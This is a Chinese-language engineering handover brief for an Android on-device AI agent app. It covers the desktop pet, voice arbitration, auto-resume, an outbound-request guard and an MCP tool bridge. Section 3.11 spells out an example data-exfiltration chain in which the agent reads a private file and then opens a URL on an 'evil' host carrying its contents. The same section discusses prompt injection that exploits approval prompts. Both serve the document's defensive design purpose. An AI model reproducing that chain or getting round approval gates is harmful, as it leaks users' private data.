# 交接简报：从这一页开始

> **⏸ 2026-11-18 暂停**：账号余额将尽，工作停在一个干净的路口。代码全在 `main`、CI 绿。
> **下次回来先看 [`docs/ops/暂停交接-2026-11-18.md`](docs/ops/暂停交接-2026-11-18.md)**
> ——那份是自包含的（冻结快照 / 剩哪三件事 / 环境坑 / 三条验证命令），不依赖聊天记录。

> **▶ 2026-11-19 已恢复 + P1 解冻**：用户指示「解冻 P1 做吧」，冻结令解除（见
> [`P1-冻结令-2026-11-17.md`](docs/architecture/P1-冻结令-2026-11-17.md) 顶部解冻标记）。
> 之后先补完了 P0 尾巴（§15 二维码、targetSdk 升级清单），再开 P1：
> - **第一轮**：`AgentRuntime` 并发原语（`core/runtime/AgentRuntime.kt`，变异 R1–R6）。
> - **第二轮**：不变量 3/4 类型层 + 静态门禁（`run-runtime-invariants-verification.sh`）。
> - **第三轮**：三入口 loop 收口——`AgentLoopFactory` 唯一构造点（不变量 1）、
>   `AgentRuntime.shared()` 进程级单例（不变量 4 前半）、ui/pet 去 `RealAgentLoop`
>   import（不变量 2 的 D1a）。
> - **第四轮**：执行权收口——`RuntimeBoundAgentLoop` 让 `send` 内部 `acquireTurn`/
>   `finally close`，`TurnEventGate` 按代次丢弃迟到事件（收尾类例外，保 T05）。
>   `acquireTurn` 第一次真的在生产路径上跑。
> - **第五轮**：解阻塞——`ChatViewModel` 上轮已顶格（3723 = 冻结上限），拆出
>   `ChatUiTypes` / `ToolGroupsFacade` / `ConnectionProbe`，压回 3413。
> - **第六轮**：工具装配收口——52 个内联 `register(...)` 搬进 `tools/ToolAssembler`，
>   `ui` / `pet` 只持有工具表、不再决定它（不变量 2 的 D1b），3413 → 3253。
>   四条硬不变量**全部 PASS、零 PENDING**（`15 通过 / 0 失败 / 0 待收口`）。
> - **第七轮**：冷启动两条恢复路径合并——运行态对账与回合日志扫描从两个协程收成
>   一条链（`TurnJournal.recoveryFor`），「有写操作可能已生效」第一次成为自动续跑的
>   一等输入（`AutoResumeReason.UNKNOWN_WRITES`）。3253 → 3224。
> P1 还剩：真机矩阵（`LoopDefaults` 单一真源已于第八轮偿还，见 §6 与
> [`P0-落地-2026-11-18.md`](docs/ops/P0-落地-2026-11-18.md) §18.7）。

> 写于 **2026-11-13** ｜ 仓库 `Kdkdmwnwdkd/Polaris` ｜ **基线 = 本文档所在的那次提交**
> （不要记 SHA：文档一经更新 SHA 就变。用 `git log -1 --format=%h` 看当前，用 §1 的命令判断它是否健康。）
> 这份文档写给「接手的人或模型」，**不依赖任何聊天记录**。读完这一页就该能开工。

---

## 0. 三十秒版本

**北辰（Polaris）**是一个跑在 Android 手机上的本地 AI Agent：Kotlin + Jetpack Compose，
两个 Gradle 模块（`:core` 内核 / `:app` 界面装配），891 个提交，约 10.3 万行生产代码，
149 个 QA runner。原创实现，参考开源项目只读思路、不抄代码。

**刚做完的三件事**（都在 `main` 上）：

| 提交 | 内容 |
|---|---|
| `a259d09` | 三个可改写接缝 + 工具守卫链（`AgentSeams` / `ToolGuardChain`） |
| `a1e25e4` | 语音仲裁：麦克风占用（`MicClaim`）+ 打断裁决（`InterruptPolicy`） |
| `1939aa2` | 修两处 Android API 在 SDK stub 下的编译差异（CI 用） |
| （本轮） | **后台任务自动续跑**：进程被系统杀掉后，冷启动替用户把上次没做完的接着做完 |

**当前状态**：桌宠一期（悬浮窗）、二期（语音闭环）、三期（一键唤起：磁贴 + 通知按钮）
都已落地。后台任务自动续跑也已落地（判定表在 `core/agent/AutoResumePolicy.kt`，
熔断上限 2 次、窗口 24 小时，设计见 `docs/specs/auto-resume-spec-v1.md`）。
全量 QA 与门禁以 `scripts/qa/run-all.sh` 的当前输出为准。

**下一步**：**真机手测**——按 `docs/qa/真机矩阵-v1.md` 的
**I1–I3**（桌宠审批卡，2026-11-18 新增，最优先）→ **H5**（锁屏拦截）→ P11/P12/P13/P14
里带保留的那几条。代码层面已闭环；**唤醒词仍然建议不做**（spec §12.1 的账：
1–3% 电量/小时 × 未知用量），磁贴是它的替代入口。剩余项的完整清单在
`docs/ops/DEVICE-VERIFICATION-PENDING.md`。

2026-11-17 深夜在一台云 Linux（x86_64 模拟器，API 30）上补跑了一轮端到端：
构建、146 个 runner、桌宠服务 + 悬浮窗 + 通知、对话 → 落盘 → 杀进程 → 回放 → 清空，
全部跑通；并抓到「冷启动必闪退」——`startForegroundService` 的 5 秒窗口撞上首帧渲染，
详见 §3.12。模拟器给不出的仍是省电策略、键盘高度、磁贴添加、ASR 时延。

---

## 1. 上手三条命令

```bash
git clone https://github.com/Kdkdmwnwdkd/Polaris.git && cd Polaris

# ① 全量验证（约 12 分钟，必须看到 FAIL=0）
bash scripts/qa/run-all.sh > /tmp/qa-full.log 2>&1; echo "exit=$?"
grep '^==== 汇总' /tmp/qa-full.log

# ② 门禁（6 项，必须 GATE PASS）
bash scripts/qa/gate.sh /tmp/qa-full.log
```

**判据**：`exit=0`、汇总行 `PASS=147 SKIP=0 XFAIL=0 FAIL=0`、`GATE PASS`。
只要有一条不满足，先修环境（见 §5），**不要**当成「代码坏了」去改代码。

---

## 2. 最近这三轮到底做了什么

### 2.1 三个接缝 + 守卫链（`core/agent/`）

目的：让「用户消息进来」「工具要执行」「助手话说完」这三个点可被外部改写，
而不用去改 1500 行的 `RealAgentLoop`。

| 文件 | 行数 | 要点 |
|---|---|---|
| `ToolGuard.kt` | 151 | `GuardDecision` 只有 `Abstain` / `Deny`，**故意没有 Allow**——守卫只能拦，不能放行，所以「忘写守卫」不会变成安全漏洞 |
| `AgentSeams.kt` | 200 | 用户消息中间件是 waterfall（可短路成 `Handled(reply)`）；助手监听是 parallel（1.5s 上限，异常隔离）；`AgentSeams.NONE` 首行短路零分配 |
| `SeamDeny.kt` | 52 | 被拒绝的调用落成一个正常的 `Completed` 回合，复用既有 `toolMessageOf` / `tool.end` / `settled`，UI 不用改 |
| `RealAgentLoop.kt` | +35 | 纯接线。守卫挂在 **loop 层**而不是 executor 层——executor 是可替换的 |

### 2.2 语音仲裁（`core/voice/` + `app/audio/`）

目的：解决「谁在用麦克风」和「现在能不能打断」，这两件事以前散在各处、各自为政。

| 文件 | 行数 | 要点 |
|---|---|---|
| `MicClaim.kt` | 245 | 单一持有者；优先级 `Capture(3) > Speak(2) > Wake(1)`；`AudioLease` 带单调 id，**释放只认 id 不认持有者**（防迟到释放误伤新持有者）；`ExternalBusy`（别的应用在录音 / 通话中）一票否决但**不算持有者**，只拆 Wake 不拆 Capture |
| `InterruptPolicy.kt` | 176 | 纯函数：`Activity(turnRunning, speaking) × Source(Voice/Text/Wake/Pet)` → `Accept` / `AcceptAfter` / `Reject`，恰好三态。判据：唤醒词的语义是「我在听」不是「重来」，所以不打断有副作用的回合；播报时拒绝唤醒（防自激） |
| `VoiceArbiter.kt` | 207 | Android 侧装配。录音探测用「自己是否持有 Capture」近似排除自己——`AudioManager.getClientUid()` 是 @hide，SDK 里调不到 |
| `TextSpeaker.kt` | +90 | 补 `stop()` 与 `speaking: StateFlow<Boolean>`；按 utteranceId 比对，防 FLUSH 后旧 `onDone` 误判 |

接线改动：`ChatViewModel` +109（`beginVoiceCapture` / `endVoiceCapture` / `send()` 仲裁分支）、
`ChatScreen` +65（语音输入过仲裁、运行中也能发）、`GenerationRunController` +24（`cancelAndWait()`：
裸 `cancel()` 之后 finish 还没跑完，owner/running 仍是旧值）。

### 2.3 两份调研（`docs/research/`）

- `10-agent-mechanisms-2026-11-13.md`：14 个项目的机制库，7 个读过源码，标 `[码]`/`[档]`/`[述]`
- `11-deepseek-harness-2026-11-13.md`：DeepSeek Harness 拆解（Cordis 五概念、五种事件分发、单调守卫、pre-step 不消耗 step）
- `12-on-device-feasibility.md`：16 个项目按「端上 / PC 侧 / 纯桌面」重分类，六条硬约束

---

## 3. 桌宠（一期 11-13 骨架 / 二期 11-14 语音 / 三期 11-14 一键唤起，等真机验证）

**完整设计在 [`docs/specs/desktop-pet-spec-v1.md`](docs/specs/desktop-pet-spec-v1.md)，先读它，别重新设计。**
「开工顺序」保留原文（它解释代码为什么长这样）；一期实现见 §3.3 表 + spec §10，
二期见 §3.6 + spec §11，三期见 §3.7 + spec §12。

### 3.1 目标与验收

让 App 从「打开才存在的助手」变成「一直在桌面上的小东西」：悬浮、可拖、点一下说话、说完会朗读。

**一期验收**（模拟器即可）：能看到桌宠 → 能拖 → 松手吸附屏幕边缘 → 点一下问「现在几点」
→ 拿到回答并听到 TTS → 关掉开关后彻底消失（进程、通知、悬浮窗都不留）。

### 3.2 起步顺序（别跳）

1. **先做「能显示、能拖、能关」**——`PetOverlayService` + `WindowManager` + `ComposeView`。
   这一步只验证一件事：悬浮窗在你目标 ROM 上不被杀。跑通了再往下。
2. **再接 Agent**——`PetAgentSession` 直接实例化 `RealAgentLoop`（先例：`SubAgentRunner.kt:97`
   在无 UI 场景下就是这么起 loop 的）。
3. **最后接语音**——最容易卡住，且最不影响骨架验证。

### 3.3 要新增/改动什么

```
新增  app/.../pet/PetState.kt             开关意图 + 运行态（AppGraph 第 26 条）
      app/.../pet/PetOverlayService.kt    前台服务 + WindowManager（TYPE_APPLICATION_OVERLAY）
      app/.../pet/PetOverlay.kt           ComposeView + 手工挂三个 owner + 拖动吸附
      app/.../pet/PetPanel.kt             形象（位图 + Canvas 叠光晕）+ 气泡 + 输入 + 语音入口
      app/.../pet/PetAgentSession.kt      独立轻量会话（最小只读工具表）
      app/.../pet/PetVoice.kt             语音输入（SpeechRecognizer 直连 + 仲裁 + 超时）
      scripts/qa/run-desktop-pet-verification.sh   39 条守卫（A–H 八段）

改动  AndroidManifest.xml                 注册 service（foregroundServiceType=specialUse）
      app/ui/SettingsScreen.kt            「桌面助手」组：总开关 + 悬浮窗/麦克风引导 + 未运行重试
      app/AgentKitApplication.kt          PetState.sync（只读盘，不启服务）
      app/MainActivity.kt                 onResume 补启动
      app/AppGraph.kt                     登记 PetState
复用  audio/AudioGraph.kt                 取进程级 TTS（`speaker(ctx)`）与仲裁器（`arbiter(ctx)`）；
                                       **不要 new TextSpeaker**，否则桌宠与主界面各有一个引擎，
                                       叠音且「唯一持有者」失效
      core/agent/RealAgentLoop.kt         直接实例化
      core/AppScope.kt                    [io] 上下文
      core/text/SpeechLogic.kt            识别结果清洗（与对话页共用同一套规则）
```

### 3.4 三条必须知道的约束

- **不要复用 `ChatViewModel`**：3625 行、绑 Activity 生命周期。屏幕侧虽然已经被 r14 收窄成
  30 个 `@Stable` 窄接口，但 ViewModel 本身仍活在 Activity 里；悬浮窗活在 Service 里，没有 Activity。
- **桌宠与主界面是两份独立会话历史**。一期不做同步（做同步要多 2 天，还要处理并发写）。
- **`SYSTEM_ALERT_WINDOW` 已声明但无实现**（`AndroidManifest.xml:31`），只需引导用户手动开启，不要新增权限申请。

### 3.5 三个拍板事项的结论（spec §4）

1. **形象**：已定，且**已换过一次**（2026-11-18）。一期是 `PetPanel.kt` 里 Canvas 自绘的
   84dp 方块（零素材，用来先证明窗口能活）；现在是重绘的位图
   `res/drawable-nodpi/pet_avatar_{open,blink}.webp`（384²，各约 28KB），窗口 96dp。
   换形象只动 `PetBody()` 一个 Composable，窗口与状态层没改——一期把它拆出来就是为了这一步。
   细节与取舍见 `docs/ops/桌宠形象-2026-11-18.md`。
2. **唤醒词**：一期二期都**不做**。常驻麦克风约 1–3% 电量/小时，先证明有人用。
3. **历史是否互通**：**不通**。桌宠定位「随手问一句」，历史只在内存里，进程死了就没。

### 3.6 二期语音（2026-11-14 落地）

**手势变了**：长按形象从「弹菜单」改成「开始听」，菜单挪到气泡标题栏的「⋯」。
真机清单 P11-7 已同步改口。理由见 spec §11.3——「长按说话」是最自然的那个动作，
放进二级菜单会让主路径变成三步。

**没有「松手结束」**：说完由引擎的静音判定收尾，句子中间的停顿不会被切断；
想提前结束就点气泡里的麦克风（toggle）。第一版写成「按住说话、松手结束」，
被 CI 拦下——Compose 的 `AwaitPointerEventScope` 是 `@RestrictsSuspension` 的，
`awaitEachGesture` 里不能调 `coroutineScope`/`launch`/`delay`，也就起不了计时器、
拿不到抬手事件。这一条值得记住，它看起来完全能编译。

**四个必须知道的约束**（都在 `PetVoice.kt` 的类注释里）：

1. **状态只在主线程改**。录音线程（`asr-capture`）的回调一律 `handler.post` 回主线程，
   再动 Compose 状态与 `onText`。
2. **一次只有一个会话，用完就拆**。`active` 之外再按一次直接忽略；`LocalSpeechInput`
   每次新建、收尾即 `cancel()`，不复用。
3. **必须有超时**。20s 硬上限（`HARD_TIMEOUT_MS`），录音层另有 30s 上限
   （`LocalSpeechInput.MAX_MS`）。`stop()` 之后**没有**另设「等结果」的宽限——收尾只等
   一次 decode。（原文写的是「20s 硬上限 + 5s 结果等待」，那是 11-14 系统识别器版本的账；
   11-16 删掉那条路时，宽限也跟着没了。）
4. **必须走仲裁**。`beginCapture` 成功即意味着播报已停——不要自己先调 `stopSpeech()`，
   互斥是仲裁的结果，不是调用方的义务。

**没有做 whisper**。原计划「快路失败回落 whisper.cpp（tiny 75 MB）」，实际没做：
NDK 编译会让 24 分钟的 CI 翻倍，APK 从 35 MB 涨到 110 MB，而收益只覆盖「没有识别服务」
和「无网络」两种场景。回落点留在 `PetVoiceInput.start()` 里 `isRecognitionAvailable` 那个分支上，
将来要做只换那一处。

**一个将来必踩的坑**：`targetSdk = 28` 时 Android 14 的「前台服务类型必须匹配能力」检查
不生效，所以 `specialUse` 却录音不会崩。**一旦 targetSdk 提到 34**，必须改 manifest 的
`specialUse|microphone` + 动态 type（无 `RECORD_AUDIO` 时不能带 microphone 位，
否则抛 `SecurityException`）。完整写法见 spec §11.5。

### 3.7 三期「一键唤起」（2026-11-14 落地，替代唤醒词）

**唤醒词没做，而且建议继续不做。** 账很简单：常驻麦克风 + 关键词检测 1–3% 电量/小时，
模型给 APK 加 42 MB（Vosk 中文）或要自己训练（Porcupine 中文词），还要解决麦克风独占；
换来的只是「不用点两下」。真实用量为零之前，这笔投入注定是负资产。

**替代方案**：把「叫它出来」摊到三个入口——桌面上的小球（一期就有）、
通知栏的「说一句」、快捷设置的「北辰」磁贴。零常驻、零新权限、零依赖。

关键实现四处：

| 位置 | 做了什么 | 为什么不能省 |
|---|---|---|
| `PetTileService` | 磁贴；锁屏走 `unlockAndRun` | 锁屏上直接开麦等于绕过用户确认 |
| `PetOverlayService.ACTION_LISTEN` | 唯一入口，`listen()` 统一收口 | 三条入口各自拼启动逻辑迟早分叉 |
| `PetState.start(ctx, action)` | action 随启动意图一起下去 | 先 start 再补一条 intent，中间服务可能已自退 |
| `PetOverlayHost.beginVoice()` | 空闲→展开+听；在听→收尾 | 语义与气泡里的麦克风按钮完全一致 |

**三个「看起来做了、其实没做」的坑**（守卫 `[I]` 段 12 条钉住）：

1. **只把桌宠叫出来、没开始听**（I8）。漏传 action 时磁贴会把小球叫到桌面上，
   然后一声不响地等着——用户张着嘴以为坏了。
2. **系统重建服务时偷偷开麦**（I7b）。`START_STICKY` 重建的 `intent` 是 null，
   若在 `onCreate` 里无条件 `beginVoice()`，用户从没点过任何东西也会开始录音。
3. **展开就弹键盘**（I10）。二期那句「`LaunchedEffect(Unit)` 只跑一次不会抢焦点」是错的：
   收起态压根不组合 `BubbleCard`，展开是全新组合。现在由 `autoFocusInput` 受控。

**一个刻意的设计**：关掉桌宠开关后点磁贴会把它重新打开。磁贴的语义是「叫它出来」，
不是「开关」。想彻底安静，把磁贴从面板上移除。

### 3.8 自动续跑（2026-11-14 落地）

`AgentRunService` 早就有了，但它只防「系统回收」，防不了「进程真被杀」。
被杀之后旧行为是「不失忆，但也不自己动」：落盘运行态、冷启动对账、续跑上下文、
孤儿调用提示全都有，**只差最后一步没人推**——用户得自己打两个字「继续」。

现在冷启动会**替用户发这句「继续」**。关键设计：

| 位置 | 做了什么 | 为什么不能省 |
|---|---|---|
| `core/agent/AutoResumePolicy.kt` | 判定表：11 种理由 → 三态（跑 / 只提示 / 静默） | 每次判定都对应一次真实请求；纯函数才能被 harness 逐条断言 |
| `ChatViewModel.autoResumeIfPossible` | 取状态 → 裁决 → 代发「继续」 | 复用 `send()`，续跑上下文/历史/前台服务/落盘/打断仲裁一个都不用重写 |
| `runStateReady`（Deferred） | 把「对账结论」从第 991 行的 init 搬到类体末尾那个 init | 前者跑在 IO 线程，会读到还没初始化的 `_activeConversationId`——2026-11-09 模拟器 NPE 就是这么来的 |
| `AgentRunState.autoResumeAttempts` | 熔断计数，随状态落盘 | 不落盘则每次冷启动归零，「一跑就被杀」的任务会被无限自动重试 |

**两个必须记住的性质**：

1. **它是重放，不是恢复执行栈。** 进程死了，协程的函数帧早就没了；能恢复的只有
   已落盘的对话历史。所以它**可能重复已完成的副作用**——靠既有的 R1 孤儿调用提示兜底
   （那段提示会照样注入这一轮，因为走的同一个 `send()`）。
2. **只在当前会话自动跑**，不自动切会话；没有模型、会话被删、中断超过 24 小时都不跑，
   只给一句说明为什么。

验证：`scripts/qa/run-auto-resume-verification.sh`（11 条结构 + 39 条行为，
含端到端模拟「续跑→被杀→再续跑」两轮后第三轮必须停手）。
真机三条见 `docs/ops/DEVICE-VERIFICATION-PENDING.md` 的 P14——它们只验**触发时机**。

### 3.9 收尾三处（2026-11-17 修）

真机验证前先把「不会崩、但用户会觉得功能坏了」的三处收掉。守卫在
`run-desktop-pet-verification.sh` 的 `[J]` 段（J1–J5，含反向变异验过）：

| 现象 | 根因 | 修法 |
|---|---|---|
| 关掉桌宠，回答还在念 | `hide()` 只拆窗、`scope.cancel()`；TTS 是进程级单例，已经交给引擎的音频停不下 | `hide()` 里 `AudioGraph.arbiter(context).stopSpeech()`（顺带释放播报租约） |
| 设置页说「运行中」，屏幕什么都没有 | `show()` 无返回值，`addView` 失败只打日志；服务照样 `markRunning(true)` | `show(): Boolean`；服务只在 true 时报运行态，失败即 `stopSelf()` |
| 转个屏桌宠就找不回来 | 窗口坐标是绝对像素，`screenSize()` 只在 show / 拖动时读 | Service 重写 `onConfigurationChanged` → `PetOverlayHost.onScreenChanged()` 按新尺寸重新贴边 |

三条都不改分层边界（`arch-baseline` 未动）。第三条只在旋转 / 折叠场景出现，但出现就等于
丢功能——服务还在跑、通知还在，磁贴再点也只是「服务已经在跑」。

### 3.10 架构方案 P0 落地（2026-11-17）

`docs/architecture/AICoding-架构方案-v3-2026-11-17.md` 的 P0「止血」五项全部落地。
共同点：**都落在既有文件内，不新增模块，`arch-baseline` 不动**。

| # | 动作 | 落点 | 守卫 |
|---|---|---|---|
| 1 | 接缝真接上：`productionSeams` 从零调用变成主界面 + 桌宠各一处 | `ChatViewModel`（loop 的 `seams=`）、`PetAgentSession` | `run-agent-seams-verification.sh` A8–A10 |
| 2 | 审批预览与判定同源（`take(500)` → 保头保尾 2000 字符） | `core/agent/ApprovalPreview.kt`、`ChatViewModel.requestApproval` | E1–E3（行为） |
| 3 | 出站守卫 `EgressGuard`：本回合读过文件/屏幕/shell 后，`web_search` 必须人确认 | `core/agent/EgressGuard.kt` | D1–D7（行为） |
| 4 | 主界面朗读并入 `AudioGraph.arbiter`（原来自建第二个 `TextToSpeech`） | `ChatScreen.TtsController` | `run-voice-arbiter-verification.sh` A17–A18 |
| 5 | 桌宠「停」+ 关闭保留会话 | `PetPanel`、`PetOverlayHost`、`PetConversation.kt` | `run-desktop-pet-verification.sh` K1–K5 |

**三个取舍，写清楚免得后人重踩：**

1. **`http_request` 不进出站守卫。** 它自己 `needsApproval = true` 且按域名记忆；再加一道
   只会让同一个动作连弹两个一模一样的「网络请求」窗。重复确认训练用户无脑点允许，比不确认更危险。
   真正的盲区（已允许域名 + 本回合读过私有内容）留给 P1 的 `Consent`——让审批弹窗带上下文，
   而不是加第二道同样的门。
2. **`web_search` 归到 `Approval.NETWORK`。** 它原来没标归组，弹窗文案会回落成
   「本次会话不再询问web_search」（`ApprovalGrouping.labelOf` 的保守回退）。EgressGuard 的
   确认框正好走这条归组，不修的话用户看不懂自己在同意什么。
3. **守卫自己声明超时。** 链默认 3 秒，而「问用户」的守卫必须等得比弹窗久（`EgressGuard` 60 秒）。
   为此给 `ToolGuard` 加了 `timeoutMs` 与 `onTurnStart`（回合边界清账），链按每个守卫自己的
   值计时。`onTurnStart` 由 `RealAgentLoop` 在回合入口统一调——用时间窗口或调用序号猜边界，
   在长回合 / 并行工具下都会错。

**本机验证账**（`QA_GRADLE_CACHE` 里备了 2.2.21 的编译器构件）：

- 全绿：`run-agent-seams`（49）、`run-desktop-pet`（75）、`run-voice-arbiter`（43）、
  `run-pet-history`（24）、`run-approval-tier`（22）、`run-private-read-approval`（30）、
  `run-shell-read-boundary`（31）
- 反向变异：删 `tainted.set(true)` → D2/D3/D4 红；删 `job?.cancel()` → K2 红；
  会话改回 `new` → K4 红；TtsController 改回自建引擎 → A17/A18 红；
  预览改回 `take(limit)` → E2/E3 红；恢复挪到取快照之后 → L2 红；清空只清内存 → L4 红；
  全部恢复后回绿
- 断言普查：1729 条，未超基线（新断言全是行为断言，`AgentSeamsVerification.kt` 的文本断言 2 → 0）
- 本机仍跑不动的：用 `kotlinc` CLI 的那批（`run-r13-catalog`、`run-approval-grouping` 等），
  机器上没有 `/tmp/kotlinc`——与改动无关，交 CI

### 3.11 五项「都要做」的落地（2026-11-17 晚）

用户在拍板时选了「都要做，往最好的方面做」。五项里三项能写代码，两项只能落地成资产。

| # | 事项 | 落地 | 守卫 |
|---|---|---|---|
| 1 | 桌宠历史落盘 | `pet/PetHistoryStore.kt` + `PetAgentSession` 恢复/保存 + 菜单「清空对话」 | `run-desktop-pet` L0–L9d、`run-pet-history` C1–C6 |
| 2 | 外发确认档位 | 定「每次问」并锁死：`EgressGuard.taintedNow` → `requestApproval` 降级为不可记忆 | `run-agent-seams` C1–C5 |
| 3 | P1 期间暂停新功能 | `docs/architecture/P1-冻结令-2026-11-17.md` + `AGENTS.md` 置顶 | 人读（无法自动判「加功能」） |
| 4 | 真机矩阵 | `docs/qa/真机矩阵-v1.md`（41 条）+ `scripts/qa/device/matrix.sh` | 脚本自身；无设备时退 2 并打 `COVERAGE INCOMPLETE` |
| 5 | 吊销泄漏的 PAT | 仓库与 869 个提交全扫：**0 条真 token**（只有测试假串）；仓库侧开 Dependabot、清误报告警 | 手工（撤销在用户账号里） |

**第 2 项为什么不是「加个设置项让用户选 5 分钟免问」**：那正是原方案里列的第二个选项，
但它把「要不要把内容发出去」变成一个**可以被记住**的决定，而提示注入的全部技巧就是让用户
在错误的语境下点一次「允许」。所以选每次问，并且把这条决定写进代码：本回合读过私有内容后，
`http_request` 的逐域记忆也失效（三档 + 会话白名单 + 截图缓存全绕过）。

**顺手补的真漏洞**：`DEFAULT_EGRESS_TOOLS` 原来只有 `web_search`，而 `web_open` / `web_eval` /
`web_click` / `web_type` 在 `ToolCatalog` 里**都免审批**。也就是
`read_file(私密文件) → web_open("https://evil/?d=" + 内容)` 全程零弹窗。四个工具已补进集合；
`http_request` 刻意不加（它有自己的逐域审批，重复弹窗是负价值）。

**第 1 项的两个边界**（后人改之前先看）：
- 只存 user/assistant 的**文本**，不存 tool 轨迹：残缺的 `tool_calls` 配对会让下一轮请求直接 400。
- 上限与内存同源（`MAX_HISTORY = PetHistoryStore.MAX_MESSAGES`）：存得比模型记得多，用户会看到
  一段模型「不认」的对话。

### 3.12 云机实测：抓到冷启动闪退（2026-11-17 深夜）

在一台 4 vCPU / 8 GB 的云 Linux（Debian 13、JDK 21、Android SDK 34、system-image
android-30）上把整条链路跑了一遍。该机没有嵌套虚拟化（`/dev/kvm` 节点在、打不开），
模拟器用 `-accel off` 纯软件跑，慢但可用。

**抓到的真 bug：冷启动必闪退。**

```
android.app.RemoteServiceException: Context.startForegroundService()
  did not then call Service.startForeground()
```

`PetOverlayService.onCreate` 第一句就是 `startForeground`，所以「漏调」是误读。真因是
**服务没被创建**：`MainActivity.onResume → ensureRunning → startForegroundService`，
而主线程接下来要跑 Compose 首帧的测量/布局/绘制，`handleCreateService` 排在队列后面。
那 5 秒窗口由系统从调用瞬间计时，超时在 `ActivityThread` 里抛——**在我们的调用栈之外**，
`runCatching` 抓不住，整个进程被判死。用户看到的是「一进 App 就闪退」。

修法（`PetState`）：
- `ensureRunning`（只在前台 `onResume` 调用）改用 `startService`，不参与 5 秒窗口；
  服务照样在 `onCreate` 里 `startForeground`，仍是前台服务。
- `start(background = true)`（磁贴 / 通知按钮，可能在后台）保留 `startForegroundService`。
- 守卫 `B3` / `B4` 把这层区分钉住：谁把它改回一条路径，哪一半就会坏。

这段为什么 CI 抓不到：146 个 runner 全是静态断言与 JVM 逻辑，没有一个能制造「主线程忙
5 秒」这个条件。

**`matrix.sh` 自己也修了 7 处**（第一次在真设备上跑就现原形）：

| 缺陷 | 表现 | 修法 |
|---|---|---|
| `adb -s X getprop` 少了 `shell` | 报告标题变成 `adb: unknown command getprop` | 补 `shell` |
| install 走 20 秒超时 | 26 MB 包没装完就被掐，判「安装失败」 | 单独 300 秒 + 认 `Success` |
| A3/A8/C4 空转判 PASS | 服务没起时也报 4 个 PASS | 前提不成立一律 SKIP |
| 「已装版本」写在表头之后 | Markdown 表格被劈开 | 移到表头之前 |
| release 包 `run-as` 失败判 FAIL | 只跟打包类型有关，被记成产品缺陷 | 认 `not debuggable` 等文本 → SKIP |
| A8 数 channel 名 | channel 在 dumpsys 里天然出现 3 次，正常服务被判「重复通知」 | 改数 `NotificationRecord` |
| 依赖 `awk` | 在没 awk 的机器上表现成「永远没有设备」 | 改 `sed` |

还有一条：一轮全是 SKIP 时脚本原本 exit 0，会被下游读成「AUTO 全过」。现在 exit 2 并在
报告里写 `INCOMPLETE`。

**跑通的端到端**（全部有 `adb` 证据）：设置页开开关 → 前台服务 + 通知 + 悬浮窗 →
气泡输入 → mock LLM（`10.0.2.2:8200`）回一句 → `files/pet/history.json` 落盘 →
`am force-stop` 重开 → 气泡回放上一轮（时间戳前缀已剥）→ 菜单「清空对话」→ 文件被删。

**仍然是 INCOMPLETE 的部分**：省电策略、键盘高度、磁贴添加、ASR 真机时延、拖动吸附手感。
模拟器给不出这些，也不会因为它们没验就变成「通过」。

---

### 3.13 MCP 对外提供（M1 只读桥，2026-11-18 凌晨）

先查了手机端 DSH 生态：开源有 20+ 个项目在做「把 DSH 装进手机」，最省的是
`jackwener/DSH-Android`（Node 24 编成 `.so`，110 MB 包），最完整的是 `DSH-APP/DSHA`
（内置 Ubuntu rootfs，1 GB）。它们的共同代价是**把 Node 搬进手机**，共同短板是
**真机控制**（只能靠无障碍 + Shizuku/ADB 硬凑）。

所以方向反过来：**把手机的工具按 MCP 暴露出去**，让那些客户端连上来把 Polaris 当手。
体积零增长，且补的正是它们缺的那块。

**落地内容**

| 层 | 文件 | 要点 |
|---|---|---|
| 协议 | `core/mcp/server/McpServerHost.kt` | 手写 HTTP/1.1（只认 `POST /mcp`）+ JSON-RPC；**零新增依赖**，不引 NanoHTTPD |
| 档位 | `McpTier.kt` | readonly / standard / full 只决定**可见性**；审批由 `needsApprovalFor` 单独判 |
| 配对 | `McpPairing.kt` | 每客户端独立 token，只存 SHA-256；爆破 10 次降级 |
| 审计 | `McpAudit.kt` | JSONL，参数只存摘要 + 前 200 字符；7 天滚动 |
| 装配 | `app/mcp/McpToolset.kt` | 7 个工具：`app_list`/`ui_tree`/`read_file`/`memory_search`/`knowledge_search`/`calculator` + `app_launch` |
| 服务 | `McpHostService.kt` | 前台 `dataSync`；入口用 `startService`（避开 5 秒窗口，同 §3.12 的教训） |
| 入口 | `McpScreen` 顶部「对外提供」卡片 | 开关 / 档位 / 生成令牌 / 撤销 |

**两个不能让步的决定**

1. **没有审批界面就拒绝。** `approver == null` 时，`needsApprovalFor` 为真的调用一律
   `-32004`。绝不能因为「是外部调用、没人看见」就放行——那正是 `dsh-purge` 拆宿主拦截面
   的同一条路。
2. **档位 ≠ 审批。** 档位放宽只是「工具可见」，`write_file` 在标准档里照样要弹卡。
   把两者合成一个维度，结果必然是「为了少弹窗放宽档位」，再也收不回。
3. **不在场 = 拒绝。** `screenOn` 由宿主注入（core 不能 import android），非 `SAFE`
   一律 `-32006`。判据是 **`isInteractive && !isKeyguardLocked`**，不是只看亮屏：
   锁屏界面本身就是亮着的 Activity，只判 `isInteractive` 等于给锁屏开了后门。

**为什么 MCP 层不吃 `ToolRegistry`**

`ToolRegistry.descriptors()` 用 `JsonSchema.serializer()`，要序列化编译器插件。
把它拖进 harness，会让行为测试在没装插件的机器上编不过 → 被 SKIP → 「被拒的调用
一次都没执行」这种安全断言**静默消失**。改成 `McpToolSource` 四个方法后，harness
只编 8 个源文件就能真跑。

**验证**：`scripts/qa/run-mcp-host-verification.sh`，9 条装配 + 27 条行为断言全绿。
其中 B11/B13 是核心：「被档位拒绝的调用，工具执行计数一次都没涨」。

**首轮 CI 红了两处，都是真问题**（不是门禁误报）：

| 门禁 | 症状 | 根因 | 改法 |
|---|---|---|---|
| S4 无 JSON 硬转换 | `McpServerHost` 用了 `?.jsonObject` | 与 hotfix33 同一类：`JsonNull` 上硬转抛异常。客户端发 `{"params":null}`（规范允许）会 500 而不是 `-32600` | 换 `objOrNull()` / `primOrNull()` |
| assertion-census | 新 harness 带 15 条文本断言 | `body.contains("-32003")` 只证明「这个子串出现过」，`-3200` 也能过 | 解析 JSON 取 `error.code` 做整数比较；`tools/list` 取名字集合做集合相等 |

副作用是断言变强了：B4 从「看到 `read_file`」变成「只读档**恰好**是
`{read_file, calculator}`」，多泄漏一个工具立刻红。

**没做（M2）**：审批卡片、DANGEROUS 工具、局域网/TLS、真实 `ToolGuardChain` 装配。

**两个已知的行为缺口**（不构成安全问题，但会让人困惑）：

| 现象 | 原因 | 怎么修（M2） |
|---|---|---|
